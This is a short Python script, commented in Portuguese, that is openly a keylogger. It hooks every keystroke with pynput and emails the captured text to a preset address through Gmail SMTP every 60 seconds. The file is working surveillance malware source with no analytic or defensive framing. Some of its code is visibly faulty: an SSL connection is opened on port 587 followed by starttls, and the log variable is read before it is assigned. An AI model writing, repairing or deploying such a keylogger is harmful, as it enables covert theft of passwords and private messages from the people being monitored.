from pynput import keyboard
import  smtplib
from email.mime.text import MIMEText
from threading import Timer


#configurações do email
EMAIL_ORIGEM = 'seu_email@gmail.com'
EMAIL_DESTINO = 'destino@gmail.com'
SENHA_EMAIL = 'sua_senha'

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'dados capiturados pelo keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server =  smtplib.SMTP_SSL('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
        except Exception as e:
            print(f"Erro ao enviar email: {e}")


    log = ""

    Timer (60, enviar_email).start()  # Envia o email a cada 60 segundos

def on_press(key):
    global log    
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += " "
        elif key == keyboard.Key.esc:
            log += "\n[ESC]"
        else:
            pass # Ignora outras teclas especiais

with keyboard.Listener(on_press=on_press) as listener:     
    enviar_email()  # Inicia o envio de email
    listener.join()    
